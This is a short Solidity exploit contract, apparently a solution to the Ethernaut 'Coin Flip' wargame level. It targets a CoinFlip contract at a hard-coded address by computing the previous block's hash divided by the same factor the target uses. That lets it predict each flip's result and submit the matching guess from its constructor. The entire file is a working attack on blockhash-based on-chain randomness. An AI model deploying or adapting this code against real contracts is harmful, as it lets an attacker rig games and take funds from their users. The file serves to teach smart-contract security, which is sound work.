// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

/// @title Frontrun the result from CoinFlip.
contract CoinFlipHack {
  address target = 0x30Dd55e6b9a2902cf4fa433663B37a6CFDcD08b5;
  uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    frontrun(target);
  }

  function frontrun(address _target) public {
    CoinFlip coinFlip = CoinFlip(_target);

    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 flip = blockValue/factor;

    bool guess = flip == 1 ? true : false;
    coinFlip.flip(guess);
  }

}